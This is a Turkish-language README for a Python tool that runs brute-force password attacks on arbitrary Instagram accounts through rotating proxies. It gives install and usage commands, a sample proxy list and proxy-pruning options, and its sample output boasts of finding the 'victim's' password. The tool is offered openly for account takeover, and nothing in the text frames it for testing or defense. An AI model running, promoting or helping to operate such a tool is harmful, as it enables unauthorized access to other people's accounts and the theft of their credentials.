## **İNSTAGRAM BRUTE FORCE ATTACK**

**BU PROGRAM, BIR PROXY LISTESI VERILDIĞINDE GÖNDERDIĞINIZ HERHANGI BIR INSTAGRAM HESABINA BRUTEFORCE UYGULAYACAKTIR.**


# **Gereksinimler**
- > *Python v3.9*
- > *Güncel Proxy Listesi*

# **ÖNCELİKLE MODÜLLERİ YÜKLEYİN**
- > *pip install pipenv*

 **PYTHON 3.9'UN KURULU OLDUĞUNDAN EMIN OLUN**
- > *pipenv --python 3.9*

# **Kurulum Gereksinimleri**
- > pipenv install

# **YARIMCI KOMUTLAR**

- *> usage: -h, --help    -k KULLANICIADI, -p PASSLISTESI,-px PROXYLISTESI,  --prune PRUNE --stats    proxy istatisliklerini görmek için -nc, --renk kapalı modu *

**Programa bir proxy listesi yükleyin. Proxy dosyası şu formatta olmalıdır: ip:port**

**Örnek;**

> *proxies_list.txt
3.238.111.248:80
206.189.59.192:8118
165.22.81.30:34100
176.248.120.70:3128
191.242.178.209:3128
180.92.194.235:80*
**

**PROXY LISTESINI YÜKLEMEK IÇIN YAZILACAK KOMUT **
- > *python3 hzvolkan.py -px <proxy yolu>*


**BU, KOMUT PROXYLER HAKKINDA SAĞLIK DURUMUNU VERIR.**

- > *python hzvolkan.py --stats*

**BU, BELIRLI BIR PUANIN ALTINDA BIR PUANA SAHIP PROXY'LERDEN KURTULMAYI SAĞLAR. AŞAĞIDA PROXY PUANI OLAN PROXY'LERIN VERITABANINI SIZE GÖSTERIR (Yazılım zaten hangi proxy'lerin kötü performans gösterdiğini otomatik olarak öğrenecek ve bunları kullanmayı bırakacaktır.)**

- > *python hzvolkan.py --prune 0.05*-

# **Kullanım**
>-  *git clone https://github.com/hzvolkan.py/volkan.git*

> - python3 hzvolkan.py -u kullanıcıadı -p passlistesi -px proxylistesi


- > *YAZILIM İÇİ
- [-] Passwordlistesi:
- [-] Kullanıcı Adı:
- [-] Şifre:
- [-] Tamamlanan:
- [-] Denenen:
- [-] Proxyler:
- [-] Bağlantı:*

- *> [!] HEYY Kurbanın Şifresini Buldum 
- [+] Kullanıcı Adı:
- [+] Şifresi:*
